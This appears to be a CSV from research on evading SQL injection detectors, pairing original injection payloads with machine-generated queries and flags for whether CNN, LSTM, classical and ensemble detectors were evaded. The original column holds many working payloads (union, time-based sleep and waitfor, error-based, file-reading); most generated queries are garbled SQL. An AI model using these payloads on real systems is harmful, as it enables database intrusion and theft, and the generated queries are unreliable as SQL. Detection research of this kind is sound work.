original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
1'   )    )    and 6690  =  3250#,SELECT MIN(#3) FROM SQL injection detection,1,0,1,1,1,1,1
-8828%'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  '%'  =  ',SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",SELECT MIN(5 ) FROM SQL injection,1,1,1,1,1,1,1
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL - SELECT jfxs FROM SQL JOIN detection of evade SQL injection detection,0,0,1,1,1,1,1
"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",SELECT MIN(sqbaa) FROM SQL injection_diagnosis,1,0,1,1,1,1,1
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",SELECT MIN(SQL) FROM SQL SELECT SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
1'  )   where 5378  =  5378,SELECT MIN(5378 = 5378) FROM SQL injection detection,1,0,0,1,1,1,0
select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,"SELECT 3672 FROM SQL AS _valid_sq_inject_sq_searcher WHERE 3672 = 8360 / NOT SELECT_Schema.character_sets ) FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM * WHERE * * = ""sq injection"" AND NOT * = ""3672 else 3672*""",1,0,0,1,1,1,0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe","SELECT MIN(6055 ='sq injection') FROM SQL SELECT MIN(6055 = 'ctxsys.drithsx.sn','sql injection'",1,1,0,0,0,0,0
1' where 3337  =  3337 and 8403  =  5760,SELECT MIN(sql injection) FROM SQL SELECT MIN(3337 = 3337) FROM SQL SELECT MIN(8403 = 5760,1,1,0,0,1,0,0
1'  )   where 2090  =  2090,SELECT MIN(2090 = 2090) FROM SQL injection,1,0,0,1,1,1,0
-5982' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'ikuh'  =  'ikuh,SELECT MIN(sql injection) FROM SQL -5982 ORDER BY ikuh,1,0,1,1,1,1,1
1 and 1=1,"SELECT * FROM query: 1 AND NOT SQL_inject = ""valid""",1,1,1,0,1,1,0
"1""  )  ",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",SELECT MIN(*) FROM SQL_injection WHERE 9020 = 9020 OR 4915 = 4915 = (SELECT MAX(*) FROM SQL_injection),1,1,0,0,0,0,0
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""ladc"" like ""ladc",SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#","SELECT MIN(sql injection) FROM SQL_Injection WHERE 1047 = 1047 = 1047 union All select null,null# = 1047",1,1,1,0,0,0,0
1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",SELECT DISTINCT 'evade SQL injection' FROM SQL ORDER BY 'gxpr',1,0,1,1,0,1,0
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injection,1,1,0,0,0,0,0
"1   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  5199  =  5199",SELECT MIN(5199 = 5199) FROM SQL injection,1,0,0,0,1,0,0
"select count  (  *  )   from generate_series  (  1,5000000  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM query_series WHERE NOT SELECT MIN(1,5000000) FROM generate_series",1,1,0,0,1,0,0
1%'   )    )    and 9198  =  9198--,SELECT MIN(9198 = 9198--) FROM SQL injection AS t1 JOIN query: 'evade SQL injection detection',0,1,0,0,1,0,0
"-9996' or make_set  (  1237  =  7111,7111  )  ","SELECT MIN(1237 = 7111,7111) FROM SQL injection AS :_executive FROM SQL_injection",1,1,0,1,1,1,0
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
' or '1'='1,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
select case when 4488  =  5522 then 1 else null end--,SELECT MIN(1 AS _null end--) FROM SQL_injection WHERE 4488 = 5522 AND NOT SELECT SELECT DISTINCT end-- end--,1,1,1,1,0,1,0
"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",SELECT DISTINCT if(load_file(load_file(load_file(load_file)) FROM SQL injection_details WHERE NOT if(sql injection) = 'evade',1,0,0,0,1,0,0
1'  )   as ulbr where 7233  =  7233 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
"-1174"" union all select 4303,4303,4303,4303#",SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -1174,1,1,1,1,1,1,1
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",SELECT MIN(SELECT) FROM (SELECT SUM(SELECT SUM(SELECT SUM(SELECT) FROM SQL_injection) AND NOT i_inaddr.get_host_address_address_name FROM (SELECT MIN(SELECT) FROM SQL_injection),0,0,1,0,1,1,0
1'   )    )     )   union all select null#,SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0,1,1,1,1,1
1   )    )     )   union all select null--,SELECT NOT SELECT DISTINCT null-- FROM SQL injection,1,0,1,1,1,1,1
ORDER BY 11#,"SELECT * FROM 11# WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1","SELECT * FROM * FROM users WHERE NOT id = 1 OR 1##@ union select 'a',version ( ) -- 1",1,1,1,0,0,0,0
"1""  )   as doai where 7024  =  7024 union all select null,null,null,null,null,null,null,null--",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
1  )   and 2457  =  8146,SELECT * FROM query: 1 JOIN SQL injection query query: 2457 = 8146,0,0,1,1,1,1,1
"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",SELECT DISTINCT ( ( ( (SELECT SUM(sql) FROM SQL)) FROM SQL,1,0,0,0,0,0,0
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = ""esq injection detection""",1,0,0,0,1,0,0
"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM sysibm.systables as t2,sysibm.systables as t3 JOIN evade SQL injection detection'",1,1,0,0,1,0,0
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--","SELECT MIN(SQL) FROM SQL_Injection WHERE NOT SELECT DISTINCT - 5218,5218,5218,5218,5218,5218,5218,5218-- for = ""SQ injection detection""",1,1,1,1,0,1,0
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '","SELECT MIN(7513 = 8586,8586 ) FROM SQL injection",1,1,0,0,0,0,0
" select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1","SELECT * FROM * FROM SQL_injections WHERE id = 1 OR ""1;"" = 1 OR 1 = 1",1,0,1,0,0,0,0
"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  '","SELECT MIN(excat) FROM SQL, SELECT 0x5c, MIN(excat) FROM SQL injection",1,1,1,1,1,1,1
-2983'  )   or 8571  =  8571--,SELECT MIN(8571 = 8571 - SELECT MIN(8571 = 8571 - SELECT MIN(8571 = 8571 - Delete SQL injection detection) FROM SQL injection,1,1,0,0,0,0,0
"1""   )    )     )   union all select null,null,null,null,null--","SELECT null,null,null,null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,1,0,1,0
"UNION ALL SELECT 1,2,3,4,5,6,7,8#",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1'   )    )    as joco where 2922  =  2922,SELECT DISTINCT esq injection detection FROM SQL SELECT esq injection detection,1,0,1,1,1,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,SELECT * FROM (SELECT * FROM query WHERE NOT hex ( randomblob ( 500000000000/2 ) = 'valid') AND NOT hex ( randomblob ( 500000000000/2 ) = 'valid',1,1,0,0,1,0,0
"1'+  (  select sged where 1181  =  1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",SELECT DISTINCT count ( * ) FROM SQL injection) AS 'evade_sq injection',1,0,1,1,1,1,1
"')) and 0=benchmark(3000000,MD5(1))%20/*","SELECT MIN(3000000,MD5(1))%20/*) FROM SQL injection",1,1,0,0,1,0,0
select case when 8227  =  1229 then 1 else null end--,SELECT MIN(1 ORDER BY COUNT(*) DESC LIMIT 1,1,0,1,0,0,0,0
"iif  (  2840  =  3788,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --","SELECT MIN(7185) FROM SQL_injection WHERE ""sql injection detection"" = 'evade sq injection detection'",1,0,0,0,1,0,0
pg_sleep  (  __TIME__  )  --,"SELECT * FROM query: pg_sleep WHERE NOT __TIME__ = ""valid""",1,0,1,1,1,1,1
" select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",SELECT * FROM * FROM users WHERE NOT id = '1' ORDER BY id = '1',1,0,1,0,1,1,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 AND ((qkat) = 'evade sq injection')",1,1,0,0,0,0,0
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",SELECT DISTINCT 'evade SQL injection detection' FROM SQL_injection,1,0,1,1,1,1,1
"""))) waitfor delay '0:0:20' --",SELECT NOT SQL_inject FROM query: '0:0:20',1,0,1,1,1,1,1
"' union select * from users where login = char(114,111,111,116);",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
ORDER BY 19--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT FROM FROM 19-- AS t1 JOIN SQL injection = ""sql"" FROM query: ORDER BY 19--",0,0,1,1,1,1,1
1 and 1=1,"SELECT * FROM query: 1 AND NOT SQL_inject = ""valid""",1,1,1,0,1,1,0
1%'   )    )    and 7989  =  3457,SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM SQL,1,1,1,1,1,1,1
"-9057""  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x7171706a71, 0x7171706a71, 0x7171706a71, 0x717a7, 0x717a71, 0x717a7, 0x717a71, 0x717a7, 0x717a71, 0x717a71, 0x717a7, 0x717a71, 0x717a767a71,'sq injection'",0,1,1,1,0,1,0
"-7323%"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,SELECT MIN(sequence) FROM SQL injection,1,0,1,1,1,1,1
admin' or 1  =  1--,SELECT MIN(1 = 1 FROM SQL injection detection,1,1,1,0,1,1,0
INSERT INTO Documents WHERE ID=x,SELECT query: SELECT SQL FROM documents WHERE ID = 'x',1,0,1,1,1,1,1
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#","SELECT MIN(sql) FROM SQL injection, SELECT SUM(null) FROM SQL, detection WHERE NOT lgxc = 1117 = 1117",1,1,0,0,1,0,0
"-6220' union all select 1462,1462#",SELECT MIN(SQL injection) FROM SQL_Injection,1,0,1,1,1,1,1
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',SELECT * FROM * FROM SQL_injections WHERE id = '1' *$. or 1 = 1 AND 1 = 1,1,1,0,0,0,0,0
"1""  )   as frmp where 6073  =  6073",SELECT MIN(6073 = 6073) FROM SQL injection detection,1,0,1,1,1,1,1
"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#","SELECT 7745,7745,7745,7745# FROM SQL SELECT 7745,7745,7745,7745# FROM 7745,7745 WHERE NOT 7745 IN (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(sql injection) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL injection) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL injection) FROM SELECT MIN(SQL) FROM SELECT 7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745,7745",1,1,1,1,0,1,0
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ","SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = ""esq injection detection""",1,0,0,0,1,0,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 AND % = '%'",1,1,0,0,0,0,0
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;",1,0,1,1,1,1,1
""",NULL)%20waitfor%20delay%20'0:0:20'%20/*","SELECT * FROM query: "",NULL)%20delay%20'0:0:20'%20/*"" FROM query: ""SQL injection"" FROM query: ""SQL""",1,1,0,0,1,0,0
"-3666""   )    )     )   union all select 4136,4136,4136--","SELECT MIN(sql injection) FROM 4136,4136,4136-- for FROM SQL_Injection WHERE NOT Query: -3666"" = 'evade SQL injection detection'",1,1,1,1,1,1,1
1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',SELECT 'ovlx' FROM SQL injection',1,0,1,1,1,1,1
-6109 union all select 6784--,SELECT 6784-- FROM SQL_Injection AS t1 JOIN 6784-- FROM SQL_Injection AS t2 ON t1.sql_injection = t2.sql injection_code WHERE NOT t2.signal_injection = 'evade',1,1,1,1,0,1,0
ORDER BY 29#,"SELECT * FROM 29# WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
1  )   as selm where 5759  =  5759,SELECT MIN(5759 = 5759) FROM query: 1 JOIN SQL injection query: MIN(5759 = 5759),0,1,1,0,1,1,0
-1217'   )    )     )   order by 1#,SELECT MIN(1#) FROM SQL injection,1,1,1,0,1,1,0
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""dtwv"" like ""dtwv","SELECT DISTINCT, swift_diagnosis FROM ""sql injection"" ORDER BY swift_diagnosis",1,0,1,1,1,1,1
1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,SELECT MIN(sgvo) FROM SQL injection,1,0,1,1,1,1,1
"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",SELECT MIN(sql injection) FROM SQL_Injection WHERE 6374 = 6374 ORDER BY elt ( 1045 = 30551 union select 1210,1,1,0,0,0,0,0
"1""  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""oxxi""  =  ""oxxi","SELECT MIN(*) FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT all_users = ""evade"" AND NOT all_users = ""sq injection detection""",1,0,0,0,1,0,0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection WHERE STRFTIME('%y', '%sql injection') = 'evadesq injection'",1,1,0,0,1,0,0
-4785' or   (  8459  =  8459  )  *4906 and 'esfn'  =  'esfn,SELECT MIN(8459 = 8459) FROM SQL injection,1,1,0,0,1,0,0
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#","SELECT 3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280,3280, SQL injection, 'evade SQL injection detection'",0,0,1,1,0,1,0
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  4976  =  4976",SELECT SUM(*) FROM SQL_injection WHERE NOT all_users = 1,1,0,0,0,1,0,0
select   (  case when   (  8993  =  8846  )   then 8993 else 8993*  (  select 8993 from mysql.db  )   end  )  #,SELECT 8993 FROM mysql.db ) end / NOT SQL_inject_sql injection,1,0,0,1,0,0,0
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,SELECT DISTINCT (SQL injection) FROM SQL_Injection) AND NOT (SQL = 3715 ORDER BY SUM(SQL),1,0,1,0,0,0,0
-3598  )   union all select 2264#,SELECT DISTINCT -3598 ) FROM SQL injection,1,0,1,1,1,1,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'pshn' like 'pshn",SELECT * FROM SQL_injection WHERE NOT rdb$types = 'evade' AND NOT rdb$collations = 't4 and ( (SELECT * FROM rdb$fields'),1,1,0,0,1,0,0
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",SELECT MIN(5037 = 5037) FROM SQL injection,1,1,0,0,1,0,0
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'","SELECT MIN(*) FROM SQL injection detection WHERE NOT id = '1' + @ ( 1 ) union select 1,version ( ) -- 1'",1,1,0,0,0,0,0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia","SELECT 6793 FROM pg_sleep WHERE NOT 6793 = ""evade SQL injection detection"" ORDER BY 6793",0,0,1,1,1,1,1
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym","SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, 'evade SQL injection'",1,0,1,1,1,1,1
1%'  )   and 9226  =  7542--,SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
select   (  case when   (  9907  =  2736  )   then 9907 else 9907*  (  select 9907 from mysql.db  )   end  )  #,SELECT 9907 FROM mysql.db ) FROM NOT SQL_inject SQL_inject ORDER BY 9907,0,1,0,1,1,1,0
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT (SELECT SUM(invalid) FROM SQL_Inject) FROM query WHERE 5048 = 5048 OR NOT char(109 ) ||char ( 99 ) ORDER BY SUM(100 ),1,1,0,0,1,0,0
"1  )   where 5385  =  5385 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""5385 = 5385 ORDER BY sysusers as sys4,sysusers as sys4,sysusers as sys7 = ""evade SQL injection detection""",1,1,0,0,0,0,0
1'  )   where 1183  =  1183,SELECT MIN(1183 = 1183) FROM SQL injection detection,1,0,1,1,1,1,1
